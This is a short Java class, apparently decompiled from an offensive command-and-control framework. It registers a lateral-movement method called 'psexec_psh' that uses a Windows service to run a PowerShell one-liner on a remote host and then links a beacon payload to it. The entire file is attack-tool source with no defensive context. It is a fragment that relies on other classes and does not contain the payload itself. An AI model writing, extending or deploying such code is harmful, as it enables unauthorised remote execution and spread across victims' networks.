package beacon.remoteexploits;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExploits;
import beacon.TaskBeacon;
import common.ListenerUtils;
import common.ScListener;

public class PsExecPowerShell implements BeaconRemoteExploits.RemoteExploit {
   protected AggressorClient client;

   public PsExecPowerShell(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconRemoteExploits(var1.getData()).register("psexec_psh", "x86", "Use a service to run a PowerShell one-liner", this);
   }

   public void jump(String var1, String var2, String var3) {
      ScListener var4 = ListenerUtils.getListener(this.client, var3);
      TaskBeacon var5 = new TaskBeacon(this.client, new String[]{var1});
      var5.PsExecPSH(var1, var2, var4);
      var5.linkToPayloadRemote(var4, var2);
   }
}
